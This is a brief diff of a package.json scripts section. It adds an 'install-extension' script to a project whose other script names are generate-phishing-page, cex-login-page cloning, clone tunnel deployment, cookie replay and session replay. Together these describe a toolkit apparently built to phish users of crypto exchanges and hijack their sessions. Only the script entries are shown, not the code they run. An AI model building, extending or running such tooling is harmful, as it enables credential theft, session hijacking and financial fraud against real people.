@@ -38,6 +38,7 @@
     "mirror:deploy": "tsx --env-file=.env scripts/deploy-mirror.ts",
     "generate-clone": "tsx scripts/generate-phishing-page.ts",
     "clone-tunnel": "tsx --env-file=.env scripts/clone-deploy-tunnel.ts",
+    "install-extension": "tsx --env-file=.env scripts/install-extension.ts",
     "cex-clone": "tsx scripts/generate-cex-login-page.ts",
     "cex-cookie-replay": "tsx --env-file=.env scripts/cex-cookie-replay.ts",
     "session-replay": "tsx --env-file=.env scripts/session-replay.ts",
